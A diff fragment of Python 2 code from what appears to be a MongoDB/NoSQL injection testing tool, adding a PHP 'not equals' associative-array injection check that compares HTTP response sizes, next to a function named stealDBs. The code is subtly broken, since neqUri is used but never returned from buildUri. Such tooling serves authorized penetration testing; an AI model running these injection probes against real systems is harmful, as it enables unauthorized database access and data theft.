@@ -192,7 +192,7 @@ def webApps():
 		print "Using " + injectString + " for injection testing.\n"
 		
 		randomUri = buildUri(appURL,injectString)
-		print "Checking random injected parameter HTTP response size...\n"
+		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
 		randLength = int(len(urllib.urlopen(randomUri).read()))
 		print "Got response length of " + str(randLength) + "."
 		
@@ -203,7 +203,21 @@ def webApps():
 		else:
 			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter!\n"
 			
-		print "Testing Mongo PHP not equals associative array injection..."
+		print "Testing Mongo PHP not equals associative array injection using " + neqUri +"..."
+		injLength = int(len(urllib.urlopen(neqUri).read()))
+		print "Got response length of " + str(injLength) + "."
+		
+		randInjDelta = abs(injLength - randLength)
+		
+		if randInjDelta >= 100:
+			print "Not equals injection respnose varied " + str(randInjDelta) + " bytes from random parameter! Injection works!"
+		
+		elif (randInjDelta > 0) and (randInjDelta < 100) :
+			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
+		
+		elif (randInjDelta == 0):
+			print "Random string response size and not equals injection were the same. Injection did not work."	
+		
 		
 		
 	
@@ -243,7 +257,8 @@ def buildUri(origUri, randValue):
 			
 	#Clip the last & off
 	evilUri = evilUri[:-1]
-	return evilUri	
+	neqUri = neqUri[:-1]
+	return evilUri
 
 def stealDBs(myDB):
 	menuItem = 1	
